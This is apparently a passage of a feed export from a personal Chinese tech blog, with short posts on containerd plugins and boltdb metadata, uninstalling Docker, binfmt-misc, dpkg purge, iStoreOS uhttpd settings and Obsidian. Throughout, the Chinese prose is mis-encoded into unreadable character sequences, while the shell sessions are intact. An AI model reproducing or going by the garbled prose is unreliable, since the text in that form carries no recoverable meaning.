class="hljs-comment"># ctr plugin ls |grep io.containerd.grpc.v1</span><br>io.containerd.grpc.v1                  containers               -              ok        <br>io.containerd.grpc.v1                  content                  -              ok        <br>io.containerd.grpc.v1                  diff                     -              ok        <br>io.containerd.grpc.v1                  events                   -              ok        <br>io.containerd.grpc.v1                  images                   -              ok        <br>io.containerd.grpc.v1                  introspection            -              ok        <br>io.containerd.grpc.v1                  leases                   -              ok        <br>io.containerd.grpc.v1                  namespaces               -              ok        <br>io.containerd.grpc.v1                  sandbox-controllers      -              ok        <br>io.containerd.grpc.v1                  sandboxes                -              ok        <br>io.containerd.grpc.v1                  snapshots                -              ok        <br>io.containerd.grpc.v1                  streaming                -              ok        <br>io.containerd.grpc.v1                  tasks                    -              ok        <br>io.containerd.grpc.v1                  transfer                 -              ok        <br>io.containerd.grpc.v1                  version                  -              ok        <br>io.containerd.grpc.v1                  healthcheck              -              ok        <br>io.containerd.grpc.v1                  cri                      linux/amd64    ok   <br></code></pre></td></tr></table></figure><h3 id="7-2-3-Metadata"><a href="#7-2-3-Metadata" class="headerlink" title="7.2.3 Metadata"></a>7.2.3 Metadata</h3><p>Metadataå±‚ä¸ºæ•°æ®åº“å±‚ã€‚containerdä¸­çš„åº•å±‚å…ƒæ•°æ®çš„å­˜å‚¨é‡‡ç”¨äº†boltdbå¼€æºæ•°æ®åº“ã€‚</p><p>metadataåœ¨å®¿ä¸»æœºä¸Šä¿å­˜çš„è·¯å¾„ä¸º <code>/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db</code></p><p>containerdä¸­çš„boltdb schemaæ•°æ®ç»“æ„å¯ä»¥å‚è€ƒ <a href="https://github.com/containerd/containerd/blob/main/core/metadata/buckets.go">https://github.com/containerd/containerd/blob/main/core/metadata/buckets.go</a></p><p>boltbrowseræ˜¯ä¸€æ¬¾å¼€æºçš„boltdbæ•°æ®åº“æµè§ˆå™¨ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># git clone https://github.com/br0xen/boltbrowser.git</span><br>Cloning into <span class="hljs-string">&#x27;boltbrowser&#x27;</span>...<br>remote: Enumerating objects: 678, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (58/58), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (37/37), <span class="hljs-keyword">done</span>.<br>remote: Total 678 (delta 29), reused 42 (delta 21), pack-reused 620<br>Receiving objects: 100% (678/678), 2.68 MiB | 6.01 MiB/s, <span class="hljs-keyword">done</span>.<br>Resolving deltas: 100% (326/326), <span class="hljs-keyword">done</span>.<br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># cd boltbrowser/</span><br>[root@ubuntu-22 boltbrowser]<span class="hljs-comment"># </span><br>[root@ubuntu-22 boltbrowser]<span class="hljs-comment"># go build</span><br>go: downloading github.com/br0xen/termbox-util v0.0.0-20170904143325-de1d4c83380e<br>go: downloading github.com/nsf/termbox-go v1.1.1<br>go: downloading go.etcd.io/bbolt v1.3.7<br>go: downloading github.com/mattn/go-runewidth v0.0.9<br>go: downloading golang.org/x/sys v0.8.0<br>[root@ubuntu-22 boltbrowser]<span class="hljs-comment"># </span><br>[root@ubuntu-22 boltbrowser]<span class="hljs-comment"># </span><br>[root@ubuntu-22 boltbrowser]<span class="hljs-comment"># ll /var/lib/containerd/io.containerd.metadata.v1.bolt/</span><br>total 196<br>drwx--x--x  2 root root   4096  4æœˆ 13 08:13 ./<br>drwx--x--x 12 root root   4096  7æœˆ  8 20:07 ../<br>-rw-r--r--  1 root root 262144  7æœˆ 24 21:25 meta.db<br>[root@ubuntu-22 boltbrowser]<span class="hljs-comment"># </span><br>[root@ubuntu-22 boltbrowser]<span class="hljs-comment"># boltbrowser /var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db </span><br>boltbrowser: <span class="hljs-built_in">command</span> not found<br>[root@ubuntu-22 boltbrowser]<span class="hljs-comment"># </span><br>[root@ubuntu-22 boltbrowser]<span class="hljs-comment"># ls</span><br>boltbrowser    build      go.mod  LICENSE  mainloop.go          README.md        screen_browser.go  stringify.go<br>bolt_model.go  cursor.go  go.sum  main.go  mainloop_windows.go  screen_about.go  screen.go          style.go<br>[root@ubuntu-22 boltbrowser]<span class="hljs-comment"># </span><br>[root@ubuntu-22 boltbrowser]<span class="hljs-comment"># ./boltbrowser /var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db </span><br>File /var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db is locked. Make sure it<span class="hljs-string">&#x27;s not used by another app and try again</span><br><span class="hljs-string">[root@ubuntu-22 boltbrowser]# </span><br><span class="hljs-string">[root@ubuntu-22 boltbrowser]# </span><br><span class="hljs-string">[root@ubuntu-22 boltbrowser]# </span><br><span class="hljs-string">[root@ubuntu-22 boltbrowser]# </span><br><span class="hljs-string">[root@ubuntu-22 boltbrowser]# systemctl stop contaienrd</span><br><span class="hljs-string">Failed to stop contaienrd.service: Unit contaienrd.service not loaded.</span><br><span class="hljs-string">[root@ubuntu-22 boltbrowser]# </span><br><span class="hljs-string">[root@ubuntu-22 boltbrowser]# </span><br><span class="hljs-string">[root@ubuntu-22 boltbrowser]# systemctl stop containerd</span><br><span class="hljs-string">[root@ubuntu-22 boltbrowser]# </span><br><span class="hljs-string">[root@ubuntu-22 boltbrowser]# </span><br><span class="hljs-string">[root@ubuntu-22 boltbrowser]# ./boltbrowser /var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db </span><br><span class="hljs-string">                                                           boltbrowser: /var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db                                                          </span><br><span class="hljs-string">==============================================================================================|=============================================================================================</span><br><span class="hljs-string">  - v1                                                                                        | Path: v1 â†’ moby â†’ content â†’ blob â†’ sha256:073c978f17eedaee7fb0d36636e1baa2ffdb6a2b5af2e458c9</span><br><span class="hljs-string">    - moby                                                                                    | Buckets: 1                                                                                  </span><br><span class="hljs-string">      - containers                                                                            | Pairs: 3                                                                                    </span><br><span class="hljs-string">        - 42caca363f947a391bb6a3606cfd29a1fe59ed9b90ad043d8b4e8c5c0a7cf2f9                    |                                                                                             </span><br><span class="hljs-string">          - labels                                                                            |                                                                                             </span><br><span class="hljs-string">            com.docker/engine.bundle.path: /var/run/docker/containerd/42caca363f947a391bb6a360|                                                                                             </span><br><span class="hljs-string">          - runtime                                                                           |                                                                                             </span><br><span class="hljs-string">            name: io.containerd.runc.v2                                                       |                                                                                             </span><br><span class="hljs-string">            options: 0a1a636f6e7461696e6572642e72756e632e76312e4f7074696f6e731226320472756e633|                                                                                             </span><br><span class="hljs-string">          createdat: 010000000ede1dc4b4310e554fffff                                           |                                                                                             </span><br><span class="hljs-string">          image:                                                                              |                                                                                             </span><br><span class="hljs-string">          snapshotKey:                                                                        |                                                                                             </span><br><span class="hljs-string">          snapshotter:                                                                        |                                                                                             </span><br><span class="hljs-string">          spec: 0a3674797065732e636f6e7461696e6572642e696f2f6f70656e636f6e7461696e6572732f7275|                                                                                             </span><br><span class="hljs-string">          updatedat: 010000000ede1dc4b4310e554fffff                                           |                                                                                             </span><br><span class="hljs-string">      - content                                                                               |                                                                                             </span><br><span class="hljs-string">        - blob                                                                                |                                                                                             </span><br><span class="hljs-string">          - sha256:03b30c6a3c320ff172b52bd68eddffde6ded08ce47e650fe52de861c5e9df46d           |                                                                                             </span><br><span class="hljs-string">            - labels                                                                          |                                                                                             </span><br><span class="hljs-string">              containerd.io/distribution.source.docker.io: library/hello-world                |                                                                                             </span><br><span class="hljs-string">            createdat: 010000000eddabc5443894fe6cffff                                         |                                                                                             </span><br><span class="hljs-string">            size: 84a001                                                                      |                                                                                             </span><br><span class="hljs-string">            updatedat: 010000000eddabc5443894fe6cffff                                         |                                                                                             </span><br><span class="hljs-string">          + sha256:073c978f17eedaee7fb0d36636e1baa2ffdb6a2b5af2e458c9612a85ad06ea5d           |                                                                                             </span><br><span class="hljs-string">          + sha256:16edc9559472f368b71e0f19a575e71080f2251f6693e7d560e21cc6472f7da6           |                                                                                             </span><br><span class="hljs-string">          + sha256:33c69a810cc314b55c9e1e218ab9eb1b39034b28b023234854f093a207a87154           |                                                                                             </span><br><span class="hljs-string">          + sha256:74f634b1bc1bd74535d5209589734efbd44a25f4e2dc96d78784576a3eb5b335           |                                                                                             </span><br><span class="hljs-string">          + sha256:796dd77ab5223837579b323c961197514e9b5e37e99babbf51f9bb2ba1dbdcc8           |                                                                                             </span><br><span class="hljs-string">          + sha256:8b08414b805beb7a1440493aa6e8cecd4729c536e8f9adc2d26514051bc31422           |                                                                                             </span><br><span class="hljs-string">          + sha256:e2fc4e5012d16e7fe466f5291c476431beaa1f9b90a5c2125b493ed28e2aba57           |                                                                                             </span><br><span class="hljs-string">          + sha256:e31c3b1cd47718260e1b6163af0a05b3c428dc01fa410baf72ca8b8076e22e72           |                                                                                             </span><br><span class="hljs-string">          + sha256:ee08ce572c81dd90a3fbb7e2f4e660a5224924efd2649fb717460659b080c41b           |                                                                                             </span><br><span class="hljs-string">          + sha256:efaa0224e7c87b2dbf8b4f0fee2bd595764adf6065a6bff6fffe833057237f64           |                                                                                             </span><br><span class="hljs-string">          + sha256:fb9c9aef62af3955f6014613456551c92e88a67dcf1fc51f5f91bcbd1832813f           |                                                                                             </span><br><span class="hljs-string">        - ingests                                                                             |                                                                                             </span><br><span class="hljs-string">      - leases                                                                                |                                                                                             </span><br><span class="hljs-string">        - moby-image-sha256:1052b284c2aa9cd4f832e76eddcba9738d7dca63a3358766e3cf0a408df4e13e  |                                                                                             </span><br><span class="hljs-string">          - content                                                                           |                                                                                             </span><br><span class="hljs-string">            sha256:efaa0224e7c87b2dbf8b4f0fee2bd595764adf6065a6bff6fffe833057237f64:          |                                                                                             </span><br><span class="hljs-string">          createdat: 010000000ede0382f628cfc681ffff                                           |                                                                                             </span><br><span class="hljs-string">        + moby-image-sha256:49b3cb3043cd00b3911213a837d1559638376017483d2d4b9761ed12e50f4f3e  |                                                                                             </span><br><span class="hljs-string">        + moby-image-sha256:86eb87ff06b5a99af56ba09c36f9f06d904cc9f467e61a2a4befdfd2e5c50a3d  |                                                                                             </span><br><span class="hljs-string">        + moby-image-sha256:8c811b4aec35f259572d0f79207bc0678df4c736eeec50bc9fec37ed936a472a  |                                                                                             </span><br><span class="hljs-string">        + moby-image-sha256:9363667f8aecb904d1f10cef4ca936f6507d25f0a50b103b55f78d336dbabe57  |                                                                                             </span><br><span class="hljs-string">        + moby-image-sha256:97f5c5e8b918580066d433f26987c2e8f7348572ec8b85957784ab80471bcb68  |                                                                                             </span><br><span class="hljs-string">        + moby-image-sha256:c80088f20cce4fd7f029dacea2e273e720f3e0d7a5a90b6cfb99d7290ea18537  |                                                                                             </span><br><span class="hljs-string">        + moby-image-sha256:d2c94e258dcb3c5ac2798d32e1249e42ef01cba4841c2234249495f87264ac5a  |                                                                                             </span><br><span class="hljs-string">    version: 06                                                                               |                                                                                             </span><br><span class="hljs-string">                                                                                              |                                                                                             </span><br><span class="hljs-string">                                                                                              |                                                                                             </span><br><span class="hljs-string">                                                                                              |                                                                                             </span><br><span class="hljs-string">Press &#x27;</span>?<span class="hljs-string">&#x27; for help    </span><br></code></pre></td></tr></table></figure><h2 id="7-3-containerd-Backend"><a href="#7-3-containerd-Backend" class="headerlink" title="7.3 containerd Backend"></a>7.3 containerd Backend</h2><p>Backendå±‚ä¸»è¦å¯¹æ¥æ“ä½œç³»ç»Ÿå®¹å™¨è¿è¡Œæ—¶ï¼Œä¹Ÿæ˜¯containerdå¯¹æ¥å¤–éƒ¨æ’ä»¶çš„æ‰©å±•å±‚ã€‚<br>Backendå±‚ä¸»è¦åŒ…æ‹¬ä¸¤å¤§ç±»ï¼šproxy pluginså’Œcontainerd shimã€‚</p><h3 id="7-3-1-containerdä¸­çš„proxy-plugins"><a href="#7-3-1-containerdä¸­çš„proxy-plugins" class="headerlink" title="7.3.1 containerdä¸­çš„proxy plugins"></a>7.3.1 containerdä¸­çš„proxy plugins</h3><p>containerdä¸­æ”¯æŒçš„ä»£ç†æ’ä»¶ç±»å‹æœ‰contentã€snapshotteråŠdiffï¼ˆcontainerd 1.7.1 ä¸­æ–°å¢çš„ç±»å‹ï¼‰ã€‚</p><ul><li>contentï¼šä»…æ”¯æŒ1ä¸ªï¼Œè¦ä¹ˆæ˜¯å†…ç½®çš„content pluginï¼Œè¦ä¹ˆæ˜¯è‡ªè¡Œå®ç°çš„content plugin</li><li>snapshotteræ’ä»¶ï¼šå¯ä»¥é…ç½®å¤šä¸ª</li><li>diffæ’ä»¶ï¼šå¯ä»¥é…ç½®å¤šä¸ª</li></ul><h3 id="7-3-2-containerdä¸­çš„Runtimeå’Œshim"><a href="#7-3-2-containerdä¸­çš„Runtimeå’Œshim" class="headerlink" title="7.3.2 containerdä¸­çš„Runtimeå’Œshim"></a>7.3.2 containerdä¸­çš„Runtimeå’Œshim</h3><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p>èŠ‚é€‰è‡ªã€ŠcontainerdåŸç†å‰–æä¸å®è·µã€‹</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€dokcerç³»åˆ—ã€‘ubuntuä¸‹å¸è½½docker</title>
    <link href="/2024/07/29/docker/%E3%80%90dokcer%E7%B3%BB%E5%88%97%E3%80%91ubuntu%E4%B8%8B%E5%8D%B8%E8%BD%BDdocker/"/>
    <url>/2024/07/29/docker/%E3%80%90dokcer%E7%B3%BB%E5%88%97%E3%80%91ubuntu%E4%B8%8B%E5%8D%B8%E8%BD%BDdocker/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># dpkg -l | grep docker</span><br>rc  docker-ce                                     5:26.1.0-1~ubuntu.22.04~jammy               amd64        Docker: the open-source application container engine<br>ii  docker.io                                     24.0.7-0ubuntu2~22.04.1                     amd64        Linux container runtime<br><br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># apt remove --purge docker-ce </span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># apt remove --purge docker.io  </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€linuxç³»åˆ—ã€‘(202407) binfmt-misc</title>
    <link href="/2024/07/29/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202407)%20binfmt-misc/"/>
    <url>/2024/07/29/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202407)%20binfmt-misc/</url>
    
    <content type="html"><![CDATA[<h3 id="ä»€ä¹ˆæ˜¯binfmt-misc"><a href="#ä»€ä¹ˆæ˜¯binfmt-misc" class="headerlink" title="ä»€ä¹ˆæ˜¯binfmt-misc"></a>ä»€ä¹ˆæ˜¯binfmt-misc</h3><p>binfmt-misc(Miscellaneous Binary Format)æ˜¯Linuxå†…æ ¸æä¾›çš„ä¸€ç§ç±»ä¼¼Windowsä¸Šæ–‡ä»¶å…³è”çš„åŠŸèƒ½ï¼Œä½†æ¯”æ–‡ä»¶å…³è”æ›´å¼ºå¤§çš„æ˜¯ï¼Œå®ƒä¸ä»…å¯ä»¥æ ¹æ®æ–‡ä»¶åç¼€ååˆ¤æ–­ï¼Œè¿˜å¯ä»¥æ ¹æ®æ–‡ä»¶å†…å®¹(Magic Bytes)ä½¿ç”¨ä¸åŒçš„ç¨‹åºæ‰“å¼€ã€‚ä¸€ä¸ªå…¸å‹çš„ä½¿ç”¨åœºæ™¯å°±æ˜¯ï¼šä½¿ç”¨<code>qemu</code>è¿è¡Œå…¶å®ƒæ¶æ„å¹³å°ä¸Šçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://cloud.tencent.com/developer/article/2394439">Linuxä¸­çš„binfmt-miscåŸç†åˆ†æ-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘ (tencent.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€linuxç³»åˆ—ã€‘dpkg</title>
    <link href="/2024/07/29/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91dpkg/"/>
    <url>/2024/07/29/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91dpkg/</url>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># man dpkg</span><br>...<br>       -P, --purge package...|-a|--pending<br>           Purge an installed or already removed package. This removes everything, including conffiles, and anything <span class="hljs-keyword">else</span> cleaned up from postrm.  If -a or --pending is given<br>           instead of a package name, <span class="hljs-keyword">then</span> all packages unpacked or removed, but marked to be purged <span class="hljs-keyword">in</span> file /var/lib/dpkg/status, are purged.<br><br>           Note: Some configuration files might be unknown to dpkg because they are created and handled separately through the configuration scripts. In that <span class="hljs-keyword">case</span>, dpkg won<span class="hljs-string">&#x27;t</span><br><span class="hljs-string">           remove them by itself, but the package&#x27;</span>s postrm script (<span class="hljs-built_in">which</span> is called by dpkg), has to take care of their removal during purge. Of course, this only applies to files<br>           <span class="hljs-keyword">in</span> system directories, not configuration files written to individual <span class="hljs-built_in">users</span><span class="hljs-string">&#x27; home directories.</span><br><span class="hljs-string"></span><br><span class="hljs-string">           Purging of a package consists of the following steps:</span><br><span class="hljs-string"></span><br><span class="hljs-string">           1. Remove the package, if not already removed. See --remove for detailed information about how this is done.</span><br><span class="hljs-string"></span><br><span class="hljs-string">           2. Run postrm script.</span><br><span class="hljs-string">...</span><br><span class="hljs-string"></span><br><span class="hljs-string"># Purge an installed or already removed package.   æ¸…é™¤å·²å®‰è£…æˆ–å·²åˆ é™¤çš„è½¯ä»¶åŒ…ã€‚</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€markdownã€‘å¸¸ç”¨è¯­æ³•</title>
    <link href="/2024/07/29/markdown/%E3%80%90markdown%E3%80%91%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/"/>
    <url>/2024/07/29/markdown/%E3%80%90markdown%E3%80%91%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>è¾“å…¥todolistæ¡†<br><code>-</code>Â <code>ç©ºæ ¼</code>Â <code>[</code>Â <code>ç©ºæ ¼</code>Â <code>]</code>Â <code>ç©ºæ ¼</code>Â å†…å®¹</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€nasã€‘(202407) å®‰è£…iStoreOS</title>
    <link href="/2024/07/29/nas/%E3%80%90nas%E3%80%91(202407)%20%E5%AE%89%E8%A3%85iStoreOS/"/>
    <url>/2024/07/29/nas/%E3%80%90nas%E3%80%91(202407)%20%E5%AE%89%E8%A3%85iStoreOS/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.cpolar.com/blog/vmware-virtual-machines-install-the-soft-routing-system-istoreos">https://www.cpolar.com/blog/vmware-virtual-machines-install-the-soft-routing-system-istoreos</a></p><h1 id="ä¿®æ”¹uHttpdçš„é»˜è®¤ç«¯å£"><a href="#ä¿®æ”¹uHttpdçš„é»˜è®¤ç«¯å£" class="headerlink" title="ä¿®æ”¹uHttpdçš„é»˜è®¤ç«¯å£"></a>ä¿®æ”¹uHttpdçš„é»˜è®¤ç«¯å£</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@iStoreOS:/etc/config<span class="hljs-comment"># cat /etc/config/uhttpd </span><br><br>config uhttpd <span class="hljs-string">&#x27;main&#x27;</span><br>        list listen_http <span class="hljs-string">&#x27;0.0.0.0:81&#x27;</span><br>        list listen_http <span class="hljs-string">&#x27;[::]:81&#x27;</span><br>        list listen_https <span class="hljs-string">&#x27;0.0.0.0:443&#x27;</span><br>        list listen_https <span class="hljs-string">&#x27;[::]:443&#x27;</span><br>        option redirect_https <span class="hljs-string">&#x27;0&#x27;</span><br>        option home <span class="hljs-string">&#x27;/www&#x27;</span><br>        option rfc1918_filter <span class="hljs-string">&#x27;1&#x27;</span><br>        option max_requests <span class="hljs-string">&#x27;3&#x27;</span><br>        option max_connections <span class="hljs-string">&#x27;100&#x27;</span><br>        option cert <span class="hljs-string">&#x27;/etc/uhttpd.crt&#x27;</span><br>        option key <span class="hljs-string">&#x27;/etc/uhttpd.key&#x27;</span><br>        option cgi_prefix <span class="hljs-string">&#x27;/cgi-bin&#x27;</span><br>        list lua_prefix <span class="hljs-string">&#x27;/cgi-bin/luci=/usr/lib/lua/luci/sgi/uhttpd.lua&#x27;</span><br>        option network_timeout <span class="hljs-string">&#x27;30&#x27;</span><br>        option http_keepalive <span class="hljs-string">&#x27;20&#x27;</span><br>        option tcp_keepalive <span class="hljs-string">&#x27;1&#x27;</span><br>        option ubus_prefix <span class="hljs-string">&#x27;/ubus&#x27;</span><br>        option script_timeout <span class="hljs-string">&#x27;360&#x27;</span><br><br>config cert <span class="hljs-string">&#x27;defaults&#x27;</span><br>        option days <span class="hljs-string">&#x27;730&#x27;</span><br>        option key_type <span class="hljs-string">&#x27;ec&#x27;</span><br>        option bits <span class="hljs-string">&#x27;2048&#x27;</span><br>        option ec_curve <span class="hljs-string">&#x27;P-256&#x27;</span><br>        option country <span class="hljs-string">&#x27;ZZ&#x27;</span><br>        option state <span class="hljs-string">&#x27;Somewhere&#x27;</span><br>        option location <span class="hljs-string">&#x27;Unknown&#x27;</span><br>        option commonname <span class="hljs-string">&#x27;iStoreOS&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@iStoreOS:/etc/config<span class="hljs-comment"># /etc/init.d/uhttpd restart</span><br><br></code></pre></td></tr></table></figure><h1 id="å®‰è£…uhttpd-luci"><a href="#å®‰è£…uhttpd-luci" class="headerlink" title="å®‰è£…uhttpd luci"></a>å®‰è£…uhttpd luci</h1><p>ç³»ç»Ÿ è½¯ä»¶åŒ…</p><p>luci-i18n-uhttpd-zh-cn</p><p>å®‰è£…ä¹‹åï¼Œåˆ·æ–°ï¼Œ<code>æœåŠ¡</code>é‡Œé¢å°±èƒ½çœ‹åˆ°uHttpdäº†</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>Synologyåº”ç”¨ç¨‹åºé—¨æˆ·<br>å¯ç”¨FileStationç«¯å£ä¸º7000</p><p>7.0 ç³»ç»Ÿ<br>æ§åˆ¶é¢æ¿ ç™»å½•é—¨æˆ· é«˜çº§ åå‘ä»£ç†æœåŠ¡å™¨</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€obsidianç³»åˆ—ã€‘07.obsidianä¸­å¦‚ä½•æ–°å»ºæ€ç»´å¯¼å›¾ï¼ŸEnhancing Mindmap</title>
    <link href="/2024/07/29/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9107.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E6%96%B0%E5%BB%BA%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%EF%BC%9FEnhancing%20Mindmap/"/>
    <url>/2024/07/29/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9107.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E6%96%B0%E5%BB%BA%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%EF%BC%9FEnhancing%20Mindmap/</url>
    
    <content type="html"><![CDATA[<p>ç¤¾åŒºå¸‚åœºå®‰è£…æ’ä»¶</p><p>å³é”®ï¼Œé€‰æ‹©â€œæ–°å»ºæ€ç»´å¯¼å›¾â€</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240131132551.png" alt="image.png"></p><p>æŒ‰ç…§å›¾ç¤ºç›´æ¥æ–°å»ºå³å¯ï¼Œå¤§æ¦‚æ•ˆæœå¦‚ä¸‹ï¼š<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240131132516.png" alt="image.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€obsidianç³»åˆ—ã€‘09.obsidianä¸­å¦‚ä½•è®¾ç½®ä¸»é¡µï¼Ÿ</title>
    <link href="/2024/07/29/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9109.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E4%B8%BB%E9%A1%B5%EF%BC%9F/"/>
    <url>/2024/07/29/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9109.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E4%B8%BB%E9%A1%B5%EF%BC%9F/</url>
    
